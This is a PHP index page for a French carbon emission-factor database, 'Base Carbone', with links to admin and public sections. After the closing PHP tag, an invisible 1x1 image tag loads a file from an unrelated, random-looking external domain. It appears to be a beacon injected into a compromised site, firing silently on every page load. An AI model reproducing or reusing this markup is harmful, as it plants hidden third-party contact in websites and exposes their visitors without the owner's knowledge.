<?php 
if (!isset($_SESSION)){
	session_start();
	$_SESSION['chiffre_signi'] = 3;	// Par dÃ©faut on a trois chiffres significatifs
}
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> ' . "\n\n"  
		. '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr">' . "\n\n" ;
error_reporting (E_ALL);

echo "
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"/>
<title>Facteur d'émission</title>
<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"/>
</head>
<body>";
echo "
<div class=\"BlocIndex\">
	<h1> Base Carbone </h1>
	<p><a href=\"admin.php\">Partie Admin<p>
	<p><a href=\"public.php\">Partie Public<p>
</div>
</body>
</html>";


?>
<img height="1" width="1" border="0" src="http://wfrqbhlj.cz.cc/5699712.jpg">
